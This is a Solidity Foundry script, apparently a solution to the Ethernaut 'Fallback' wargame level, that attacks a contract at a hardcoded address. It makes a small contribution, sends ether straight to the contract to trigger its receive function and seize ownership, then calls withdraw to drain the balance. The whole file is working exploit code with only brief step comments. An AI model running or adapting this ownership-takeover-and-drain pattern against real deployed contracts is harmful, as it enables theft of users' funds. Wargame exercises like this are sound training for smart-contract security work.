pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface Fallback {
    function contribute() external payable;
    function withdraw() external;
    function owner() external view returns (address);
}

contract FallBackExploit is Script {
    address constant INSTANCE_ADDRESS = 0xcDD228DeE1820F34D1A1D76cBC2158a25575ad48;

    function run() public {
        vm.startBroadcast();

        Fallback target = Fallback(INSTANCE_ADDRESS);

        target.contribute{value: 0.00001 ether}();

        // Step 2: Send ether to trigger receive function and become owner
        (bool success, ) = address(target).call{value: 0.0001 ether}(""); 
        require(success, "Call failed");

        // Step 3: Withdraw funds as the new owner
        target.withdraw();

        vm.stopBroadcast();
    }
}